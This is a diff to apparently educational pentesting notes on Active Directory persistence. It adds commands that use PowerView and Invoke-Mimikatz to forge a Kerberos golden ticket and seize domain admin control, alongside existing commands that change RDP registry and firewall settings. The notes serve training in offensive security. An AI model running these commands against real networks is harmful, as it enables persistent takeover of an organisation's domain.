@@ -42,6 +42,15 @@ Here we assume we have a shell with administrative privileges on the target
 - We could then connect to the target using rdp and disabling anti-virus this way
 - Disable Remote Desktop Commection: `powershell reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f; Disable-NetFirewallRule -DisplayGroup "Remote Desktop"`
 
+## Golden Ticket Persistence
+
+- Here we will powershell along with powerview.ps1 and invoke-mimikatz.ps1
+- `. .\powerview.ps1`
+-  `Get-DomainSID` this will give us the domain SID, we will need to copy it
+-  `. .\invoke-mimikatz.ps1`
+-  `Invoke-Mimikatz -Command '"kerberos::golden /user:administrator /domain:domain.local /sid:PUT-THE-SID-HERE /krbtgt:PUT-HERE-TICKET-OF-DC-KRBTGT /ptt"'`
+-  We should be a domain administrator and have control of the domain controller and we can promote a compromised user to domain admins
+
 ## Resources
 
 {% embed url="https://academy.tcm-sec.com/p/movement-pivoting-and-persistence-for-pentesters-and-ethical-hackers" %} TCM security Academy -  Movement pivoting and persistence for pentesters and ethical hacker {% endembed %}
